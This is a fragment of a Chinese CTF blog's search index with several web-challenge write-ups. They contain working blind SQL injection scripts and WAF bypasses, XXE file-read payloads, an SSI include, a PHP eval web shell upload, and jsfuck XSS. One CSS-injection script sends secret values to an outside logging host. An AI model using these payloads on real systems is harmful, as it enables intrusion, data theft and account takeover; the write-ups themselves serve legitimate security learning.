=\"http://210.32.4.20/register.php\"login_url = \"http://210.32.4.20/login.php\"answer_url = \"http://210.32.4.20/answer.php\"logout_url = \"http://210.32.4.20/logout.php\"header = &#123; \"Cookie\": \"PHPSESSID=ort60sffvfo8sfjfc9h5htk16p\"&#125;res = \"alert('Your grades is 0');\"flag = \"\"def test(): response = requests.post(answer_url,data=&#123; \"1.a\": \"on\" &#125;,headers=header).content if res in response: return resdef register(message): requests.post(register_url,data=&#123; \"username\": message, \"password\": 123 &#125;,headers=header)def login(message): requests.post(login_url,data=&#123; \"username\": message, \"password\": 123 &#125;,headers=header)def logout(): requests.post(logout_url,headers=header)for i in range(1,50): print(\"trying: \" + str(i)) for j in range(32,128): payload = \"1' and if((ascii(substr((select flag from flag),%s,1))=%s),exp(~(select * from(select user())a)),1)#\"%(i,j) register(payload) login(payload) if test(): flag += chr(j) print(flag) logout() break logout()print(\"flag is \" + flag) SimpleServerInjection提示是ssi漏洞，博客做题23333https://www.secpulse.com/archives/66934.html然后1&lt;!--#include virtual=\"flag\"--&gt; 就有flag了 SimpleExtensionExplorerInjection这题给了源码的包，审计源码可以看到UserController.php里面有个UserPayload可以看到函数里面有个@XBRead函数，可以解析XML同时回显，XXE打过去1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///flag\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 然后就能有flag了 SimplePrintEventLogger这题跟上一题差不多，感觉只是多了个框架，但是发送的请求还是可以进行xml解析，只不过这次不知道flag文件叫什么，继续XXE打过去1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 发现回显的目录里面有个flagvvvvvaaaagegsgag2333文件，继续读就有flag了1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///flagvvvvvaaaagegsgag2333\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; SimpleWasmReverse这题逆向肉鸡真的不会，溜溜球了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/18/2018高校运维赛wp/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"suctf招新赛wp","date":"2018-11-14T16:00:00.000Z","path":"2018/11/15/suctf招新赛wp/","text":"招新赛这段时间刚好撞上一堆其他比赛，肉鸡肝不动了，趁着这几天平台还没关赶紧做一下。 where are you from level1这题点进去看见hello from + 本机ip地址，而且提示only guest from 127.0.0.1 can get flag of level1，抓包将client-ip改成127.0.0.1就有flag了 include me这题点进去可以看到一个改变语言的选择框，选下其他的发现除了语言有变化，网站连接的后面lang的值也会改变，可以想到这是一个文件包含的点尝试一下进行伪协议利用，?lang=php://filter/read/convert.base64-encode/resource=index.php，发现确实可以进行文件读取，解密就有flag了 yunpan这个网站点进去可以看到一堆的文件，点开后面几个视频将它们下下来，看了一下，都是葫芦娃，没看出什么，点开readme.txt也只是一堆的嘤嘤嘤…….仔细看看，发现有个302解密一下这堆base64，发现正好是readme.txt，将flag.php解密一下发过去，发现有个flag.php下下来，打开就有flag了 onepiece这题点开看见网页显示用了phpstorm，想一下平时我们用phpstorm的时候总是会有一个.idea文件，尝试一下在链接后面加.idea，发现一堆文件将他们下下来发现里面有UpL0ad.php、README.html、index.php访问UpL0ad.php是一个文件上传的地方访问一下readme.html看见于是在链接后面加个onepiece.zip，发现有文件下下来，里面有个jiami.php，打开看见一堆混淆代码，找个网站解密一下 https://tool.lu/php ，可以看见很明显的变量覆盖，在upload.php页面上抓包将file的变量改成flag就拿到flag了 easy_upload这题很明显的文件上传漏洞，尝试一下上传php文件，嗯，确实触发waf了，只允许传png文件，改下content-type成image/png，然后再把后缀改成phtml就可以上传文件了，但是却回显不能包含&lt;?php，这里用javascript去绕过12345&lt;head&gt;&lt;script language=\"php\"&gt;eval($_POST[\"cmd\"]);&lt;/script&gt; &lt;/head&gt; 发现成功上传文件，菜刀连过去打开flag.php就有flag了 baby_upload这题也是文件上传的题目，点进去尝试一下传个php文件，也是只能传图片，想传个php文件然后改变绕过，结果发现开着代理刚选完文件就弹只能选图片，看来前端有个js检测文件的，看下源码确实是有想禁用了火狐的js然后再改包，可是不知道为什么禁用了还是发不了包，只能先发一个图片的包然后改，最后改了content-type和后缀成phps再加一句shell语句就能成功get flag了 php is No.1点进去看见一堆源码123456789101112131415161718192021222324252627282930 &lt;?phpinclude 'flag.php';isset($_GET['time'])?$time = $_GET['time']:$time = 0;isset($_GET['num'])?$num = $_GET['num']:$num = 0;$c=is_numeric($time) and is_numeric($num);if ($num == 0) &#123; if($num)&#123; if($c)&#123; if(!is_numeric($time)) echo 'Time time must be number'; else if ($time &lt; 60 * 60 * 24 * 30 * 1) echo 'This time is too short'; else if ($time &gt; 60 * 60 * 24 * 30 * 2) echo 'This time is too long'; else&#123; sleep((int)$time); echo $flag; &#125; &#125; else echo 'Try again'; &#125; else echo 'Try again';&#125;else echo 'Try again';echo '&lt;hr&gt;';highlight_file(__FILE__);?&gt; 简单来说，就是要传两个值，一个num一个time，然后num要是数字且等于0，然后time的值必须在2592000和5184000之间，如果符合让浏览器sleep time的时间，然后再输出flag，显然直接让浏览器睡这么长是不现实的，所以我们要用科学计数法绕过，至于num，就用%00截断，或者输个字符也行 where are you from level2这里我们要先看level1出来的源码123456789101112131415161718 &lt;?phpfunction getIp()&#123; if(!empty($_SERVER['HTTP_CLIENT_IP']))&#123; $cip=$_SERVER['HTTP_CLIENT_IP']; &#125; elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $cip=$_SERVER['HTTP_X_FORWARDED_FOR']; &#125; elseif(!empty($_SERVER['REMOTE_ADDR']))&#123; $cip=$_SERVER['REMOTE_ADDR']; &#125; else&#123; $cip=''; &#125; $cip=preg_replace('/\\s|select|from|limit|union|join/iU','',$cip); return $cip;&#125; $query=$mysqli-&gt;query(\"insert into ip_records(ip,time) values ('$ip','$time')\"); 可以看到，select等关键字被过滤了，但是可以用重写去绕过，剩下的就是注入了Client-Ip: 12’,(selselectect//database()))#Client-Ip: 12’,(selselectect//group_concat(table_name)//ffromrom//information_schema.tables//where//table_schema=database()))#Client-Ip: 12’,(selselectect//group_concat(column_name)//ffromrom//information_schema.columns//where//table_name=’flaaag’))#Client-Ip: 12’,(selselectect//fl4g//ffromrom//flaaag))#好了，flag就出来了 classic sqli源码12345678910111213141516171819&lt;?php include \"./config.php\";include \"./flag.php\";error_reporting(0);$black_list = \"/guest|limit|substr|mid|like|or|char|union|select|greatest|\\'|\";$black_list .= \"=|_| |in|&lt;|&gt;|-|\\.|\\(|\\)|#|and|if|database|where|concat|insert|having|sleep/i\";if(preg_match($black_list, $_GET['user'])) exit(\"Hacker detected!\"); if(preg_match($black_list, $_GET['pw'])) exit(\"Hacker detected!\"); $query=\"select user from chal where user='$_GET[user]' and pw='$_GET[pw]'\"; $result = mysqli_query($link, $query);$result = mysqli_fetch_array($result);$admin_pass = mysqli_fetch_array(mysqli_query($link, \"select pw from chal where user='admin'\"));echo \"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;\";if($result['user']) echo \"&lt;h2&gt;Bonjour!, &#123;$result['user']&#125;&lt;/h2&gt;\"; if(($admin_pass['pw'])&amp;&amp;($admin_pass['pw'] === $_GET['pw']))&#123; echo $flag; &#125;highlight_file(__FILE__); ?&gt; 这题是正则表达式盲注，过滤了很多东西，普通的盲注基本是不可能的了，只能进行正则盲注获得管理员的密码。利用regexp去匹配正则表达式，用/**/代替空格，最后用%00进行截断payload:1?user=\\&amp;pw=^0%26%26user/**/regexp/**/0x61646d696e%26%26pw/**/regexp/**/%22^&#123;&#125;%22;%00 肉鸡技术太差，脚本报了个错，最后只能用burp去进行注入了（逃这里就不贴脚本了，最后爆出密码是1adpmh105i31，登录就完事了 xss1源码1234567891011&lt;script&gt;function check(input) &#123; while (input.indexOf('alert') &gt;= 0) &#123; input = input.replace(/(alert)+/g, ''); &#125; input = 'console.log(\"' + input + '\");'; var script = document.createElement('script'); script.innerText = input; document.body.appendChild(script);&#125;&lt;/script&gt; 这道题题目提示说alert(1)就行，但是可以看见，无论有多少个alert，js代码都会将它去掉，因此我们只能用其他的办法进行绕过，这里用jsfuck编码构造payload，只要闭合了前面的console.log，再注释掉后面的符号就可以弹1了1\");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])();// 好了，flag get√ gallery未完待续，先让肉鸡搞懂先 xss2源码1234567&lt;script&gt;function check(input) &#123; input = input.replace(/[^\\[\\]\\!\\+]+/g, ''); console.log('Filtered input: ' + input); eval(eval(input) + '(1)');&#125;&lt;/script&gt; 可以看到，正则表达式只允许[]和!，因此我们还是回到jsfuck编码的利用12345a: [![]+[]][+[]][+!![]]l: [![]+[]][+[]][!+[]+!+[]]e: [![]+[]][+[]][!+[]+!+[]+!+[]+!+[]]r: [!![]+[]][+[]][+!+[]]t: [!![]+[]][+[]][+[]] 将他们加起来就是payload了1[![]+[]][+[]][+!![]]+[![]+[]][+[]][!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]] 403readfile这题进去看到一个非常非常真的403页面，但是看下状态码是200，嗯，搞事情啊然后扫下后台看见有个robots.txt，访问看一下有两个disallow，一个是flag.php，一个是get.php估计也是文件包含什么的了，果然点开get.php看见里面有个链接，点了以后有个file，没错了，就是这里了，最初的链接是./1.txt，发现去掉./直接访问1.txt也可以找到文件，大胆猜测是不是过滤了./，果然，尝试一下访问in./dex.php也是可以正常回显的，确定是过滤./了，访问一下fl./ag.php发现文件找不到，emmm，尝试一下上一个目录，?file=…//fla./g.php，然后就发现拿到flag了 secure html这题后台的思路是secure_html.php先给你一个输入框，然后你在里面写东西，然后就根据你的session去创建一个对应的html文件，放在pages目录下，然后再将新建的html文件的内容插入secure_html.php的开头因为自己创建的html的内容的可控的，所以我们只需要在里面插入php代码，然后执行就可以实现任意命令执行了，但是尝试一下发现secure_html.php对php过滤的很严格，就算是转成script去写也是会被过滤掉…emmm…看来此路不通=_=这里插一个知识点，在nginx开启了webdav模块的时候是支持用http方法中的PUT方法更新文件的，所以我们可以尝试一下将php语句写进去已经创建了的html文件这里的flag文件是在根目录这样我们就将php语句写进去html文件了，再次访问secure_html.php文件也就可以拿到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/15/suctf招新赛wp/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"你拿不到我的源码","date":"2018-11-13T16:00:00.000Z","path":"2018/11/14/你拿不到我的源码/","text":"传送门：http://laohulaohuhu.cn:32771/guest登录进去就看到一个很明显的文件包含点，filter读一下index.php那些文件出来解密居然是乱码的……..我佛辣…….然后尝试一下读多几个文件出来，发现开头都是&lt;@rkt，很像&lt;?php，看一下字符的ascii码，发现第n个位置的字符的ascii码减去n-1就可以正常解密了，但是要注意一下不能超过128，给个脚本123456789import base64strs = \"待解密字符\"res = base64.b64decode(strs)str2 = \"\"i = 0for c in res: str2 += chr(((ord(c) - i)%128 + 128) %128) i += 1print(str2) 解密出来可以看到是如下文件，这里只放php的部分12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758index.php&lt;?php session_start(); define(\"enter\", 1); ini_set(\"error_reporting\", 0); if (preg_match(\"/sess_|php(\\w)+/i\", $_GET['page'])) &#123; $_GET['page'] = \"login.php\"; &#125; $page = isset($_GET['page'])? $_GET['page'] : \"login.php\"; include $page;home.php&lt;?php if (enter !== 1) &#123; header(\"location:index.php?page=home.php\"); &#125;else if (!isset($_SESSION['user'])) &#123; header(\"location:index.php?page=login.php\"); &#125;?&gt;&lt;?php if ($_SESSION['user'] === 'Admin') &#123; echo \"&lt;li class=\\\"nav-item active\\\"&gt;&lt;form id=\\\"submit_key\\\" action=\\\"index.php?page=home.php\\\" method=\\\"post\\\" class=\\\"nav-link\\\"&gt;&lt;input type=\\\"number\\\" name=\\\"key\\\" class=\\\"form-control\\\" placeholder=\\\"Submit Admin Key\\\" required autofocus&gt;&lt;/form&gt;&lt;/li&gt;&lt;li class=\\\"form-inline my-2 my-md-0\\\"&gt;&lt;button class=\\\"btn btn-lg btn-primary btn-block\\\" type=\\\"button\\\" onclick=\\\"document.getElementById('submit_key').submit();\\\"&gt;Submit key&lt;/button&gt;&lt;/li&gt;\"; &#125;?&gt;&lt;?php if ($_SESSION['user'] === 'Admin' &amp;&amp; isset($_POST['key'])) &#123; if (GWHT_CheckCrypto($_POST['key'])) &#123; echo \"&lt;span style='color: green'&gt;Hey Admin! Your flag is: GWHT&#123;\" . $_SESSION['flag1'] . $_POST['key'] . \"&#125;&lt;/span&gt;\"; &#125;else &#123; echo \"&lt;span style='color: red'&gt;No! You are a fake Admin! I will not give my flag to me&lt;/span&gt;\"; &#125; &#125;else if ($_SESSION['user'] === 'Guest') &#123; echo \"&lt;span style='color: red'&gt;My flag is for Admin, not for Guest!&lt;/span&gt;\"; &#125;?&gt;login.php&lt;?php if (enter !== 1) &#123; header(\"location:index.php?page=login.php\"); &#125;else &#123; $info = \"Please login in\"; if (isset($_POST['user']) &amp;&amp; isset($_POST['pwd'])) &#123; if ($_POST['user'] === 'Guest' &amp;&amp; $_POST['pwd'] === 'Guest') &#123; $_SESSION['user'] = 'Guest'; header(\"location:index.php?page=home.php\"); &#125;else &#123; if (twings($_POST['user'], $_POST['pwd'])) &#123; $_SESSION['user'] = 'Admin'; $_SESSION['flag1'] = $_POST['pwd']; header(\"location:index.php?page=home.php\"); &#125; $info = \"&lt;span style='color: red'&gt;Login failed&lt;/span&gt;\"; &#125; &#125; &#125;?&gt; 可以看到关键的几句可以看见flag是由flag1的session和传过来的key决定的，而flag1的session是由传过去的pwd决定的，但是没看到有什么继续包含的文件了，剩下的应该就是扩展的事了读一下phpinfo，可以看到扩展的目录和扩展名，写个脚本把扩展文件下下来123456789#!python#!/usr/bin/pythonimport urllib2import base64u = urllib2.urlopen('http://laohulaohuhu.cn:32771/index.php?page=php://filter/read/convert.base64-encode/resource=/usr/lib/php/20151012/twings.so')localfile = open('twings.so','wb')u = base64.b64decode(u.read())localfile.write(u)localfile.close() 将下下来的扩展文件用ida打开，可以看到三个函数，emmm，与题目有关系的也是这三个函数zif_twings前面一堆没看懂，但是后面的一堆check有点意思，可以看到那个if语句比对了user的值，然后再去比对pwd的值，大胆猜测，Admin_CheckBy-Twings就是管理员的用户名，后面的pwd比对将它改成赋值就可以获得pwd的值了接下来是GWHT那个文件，关键点在encrypt函数，跟过去看一看可以看到，这个函数是个布尔函数，只需要传一个值，然后进行比对，最后当v1和v3符合条件的时候返回true函数分析完了，最后是re的脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int check[20]; check[0] = 9; check[1] = 10; check[2] = 116; check[3] = 25; check[4] = 46; check[5] = 0; check[6] = 4; check[7] = 126; check[8] = 180; check[9] = 55; check[10] = 104; check[11] = 20; check[12] = 24; check[13] = 128; check[14] = 196; check[15] = 90; check[16] = 92; check[17] = 228; check[18] = 47; check[19] = 78; char user[40] = \"Admin_CheckBy-Twings\"; char pwd[40]; printf(\"user: %s\\n\",user); int i = 9; int v9 = 0; for(int j=0; j&lt;20; j++)&#123; int val = (user[v9] ^ (i &gt;&gt; (v9 - 3 * (((unsigned __int64)(1431655766LL * (signed int)v9) &gt;&gt; 32) - ((signed int)v9 &gt;&gt; 31)))));// printf(\"%d\\n\",val); pwd[j] = char(val); v9++; i=check[v9]; &#125; printf(\"pwd: %s\\n\",pwd); unsigned long long v1,v3; long long v2; v1 = -4498904630171527645LL; v3 = -5341655318926559416LL; v2 = 38300879488LL; while(v2!=0 &amp;&amp; v3!=71877284LL)&#123; v3 -= (v2 + v1) ^ (16 * v1 + 72) ^ ((v1 &gt;&gt; 5) + 84); v1 -= (v2 + v3) ^ (16 * v3 + 71) ^ ((v3 &gt;&gt; 5) + 87); v2 -= 1196902484LL; &#125; printf(\"v1: %I64u\\n\",v1); printf(\"v2: %I64d\\n\",v2); printf(\"v3: %I64u\\n\",v3); return 0; &#125; 脚本跑出来的结果最后flag","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/14/你拿不到我的源码/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"web+re","slug":"web-re","permalink":"https://xi4or0uji.github.io/tags/web-re/"}]},{"title":"很简单的xss","date":"2018-11-13T16:00:00.000Z","path":"2018/11/14/很简单的xss/","text":"继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..嗯，这波操作有丶东西，style属性里面的语句可控，就可以搞事情了，因为现在的浏览器版本比较高，尝试了一下直接利用js伪代码发现不行，只能一个个匹配然后弹回去自己的平台最后脚本1234567891011121314import requestsstrs = \"0123456789_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\"url = \"http://laohulaohuhu.cn:32772/\"flag = \"\"flag0 = \"\"for ch in strs: flag = flag0 + ch print(\"trying \"+ flag) key = &#123;'feedback':'111','style':'#secret[value^=\"' + flag + '\"]&#123;background: url(\\'http://abcdef.ceye.io/?xss=' + flag + '\\');&#125;'&#125; r = requests.post(url=url,data=key) if r.status_code == 200: print flag flag0 = flagprint(flag0) 剩下的可以去自己的平台看一下有没有打到，flag也能出来了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/14/很简单的xss/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://xi4or0uji.github.io/tags/xss/"}]},{"title":"HCTF2018 writeup","date":"2018-11-11T16:00:00.000Z","path":"2018/11/12/HCTF2018-writeup/","text":"warmup这题进去要求你读/ffffllllaaaagggg文件源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 可以看到需要进行一个白名单过滤，然后再请求文件，可以利用?进行截断，然后再通过include去请求文件payload:1http://warmup.2018.hctf.io/index.php?file=hint.php?/../../../../ffffllllaaaagggg 参考：http://seaii-blog.com/index.php/2018/07/03/84.html sharerobots.txt看到的源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* this terrible code */class FileController &lt; ApplicationController before_action :authenticate_user! before_action :authenticate_role before_action :authenticate_admin protect_from_forgery :except =&gt; [:upload , :share_people_test]# post /file/upload def upload if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != \"\") file = params[:file][:myfile] name = Base64.decode64(file.original_filename) ext = name.split('.')[-1] if ext == name || ext ==nil ext=\"\" end share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+\"/public/upload\") share.write(Base64.decode64(file.read)) share.close File.rename(share.path,share.path+\".\"+ext) tmp = Sharefile.new tmp.public = 0 tmp.path = share.path tmp.name = name tmp.tempname= share.path.split('/')[-1]+\".\"+ext tmp.context = params[:file][:context] tmp.save end redirect_to root_path end# post /file/Alpha_test def Alpha_test if(params[:fid] != \"\" &amp;&amp; params[:uid] != \"\" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil) fid = params[:fid].to_i uid = params[:uid].to_i if(fid &gt; 0 &amp;&amp; uid &gt; 0) if(Sharelist.find_by(sharefile_id: fid)==nil) if(Sharelist.count(\"user_id = ?\", uid.to_s) &lt;5) share = Sharelist.new share.sharefile_id = fid share.user_id = uid share.save end end end end redirect_to(root_path) end def share_file_to_all file = Sharefile.find(params[:fid]) File.rename(file.path,Rails.root+\"/public/download/\"+file.name) file.public = true file.path = Rails.root+\"/public/download/\"+file.name file.save endend 未完待续…….. kzonewww.zip 下载了源码然后可以看到member.php有利用cookie进行登录的验证123456789101112131415161718if (isset($_COOKIE[\"islogin\"])) &#123; if ($_COOKIE[\"login_data\"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\"); if ($udata['username'] == '') &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $login_data['admin_pass']) &#123; $islogin = 1; &#125; else &#123; setcookie(\"islogin\", \"\", time() - 604800); setcookie(\"login_data\", \"\", time() - 604800); &#125; &#125;&#125; 可以看到将login_data取出来然后进行json_decode，再根据admin_user的值去数据库进行选择，如果没有值，登录失败，否则将password进行sha1加密接着跟login_data的admin_pass进行比对，相等即登陆成功，这里有个关键点就是admin_pass和login_data的比对是弱类型比对，因此我们可以进行数字与字符串的弱等于进而绕过，密码用数字进行爆破最终payload1islogin=1; login_data=&#123;\"admin_user\":\"admin\", \"admin_pass\": 65&#125; 成功登了进去却没有看到flag，只能对数据库进行爆破看一下safe.php1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;function safe($string)&#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = safe($val); &#125; &#125; else &#123; $string = waf($string); &#125; return $string;&#125;foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt; 可以看到，safe.php对cookie传过来的值进行了waf的过滤，然后再将过了waf的值放进cookie进行下一步操作，而waf几乎把所有函数都过滤了…….这里可以先留意一个逻辑，后台对于cookie里面的值，都是先进行了waf的过滤，然后json_decode，最后进行数据处理，因此我们可以对字符进行json编码，从而绕过waf的限制盲注脚本 123456789101112131415161718192021222324import requestsimport timeurl = \"http://kzone.2018.hctf.io/admin/login.php\"res = \"\"chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%@&amp;*()-+=,|./:;?\"for i in range(1,50): for char in chars: start_time = time.time() # '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\\#|\\s/i'; # payload = \"'\\u006fr\\u0020s\\u0075bstr(pass\\u0077ord,&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,chr(char)) # admin BE933CBA048A9727A2D2E9E08F5ED046 # payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.talbes\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # F1444g # payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_NAME\\u003d'F1444g'\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # F1a9 payload = \"'\\u006fr\\u0020s\\u0075bstr((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d'&#123;1&#125;'\\u0020and\\u0020sl\\u0065ep(5)\\u0023\".format(i,char) # hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125; headers = &#123;\"Cookie\":'islogin=1; login_Data=&#123;\\\"admin_user\\\":\\\"'+payload+'\\\",\"admin_pass\": \"0\"&#125;'&#125; result = requests.get(url,headers=headers) if time.time()-start_time &gt; 3: res += char print(res) breakprint(res) admin这题可以看到提示了在github上面有源码，https://github.com/woadsl1234/hctf_flask/将文件下下来可以看到有个1.sh说了每30秒重置一次数据库然后再去找源码可以看到route.py的login函数将传过来的username的值strlower一下，然后change里面也对username进行strlower再跟过去看一下strlower是什么东西嗯，就是一个将大写转成小写的函数，但是结合前面的函数可以看现一个漏洞，如果我们先注册一个名字为ᴬᴬᴬ的用户，然后strlower就会将它转成AAA，这个时候是跟后台的aaa不同的，因此可以注册成功，这是如果我们再进行修改密码，可以看到，change函数也有一个strlower函数，这时AAA就会被转成aaa，然后就成功地越权改了密码了因此最后的操作就是，先注册一个ᴬdmin，然后改密码再以admin的身份登录就有flag了参考：https://paper.tuisec.win/detail/a9ad1440249d95b hide and seek","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/12/HCTF2018-writeup/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2018上海市大学生信息安全竞赛web题解","date":"2018-11-05T16:00:00.000Z","path":"2018/11/06/2018上海市大学生信息安全竞赛web题解/","text":"记下知识点，当做个笔记好了 web1这题进去就提示看robots.txt，然后可以看到source.php和flag.php，访问一下source.php可以看见要以admin身份登录，于是post一个admin=1过去，发现还要本地访问，改一下x-client-ip成127.0.0.1，再post一个url=http://www.ichunqiu.com 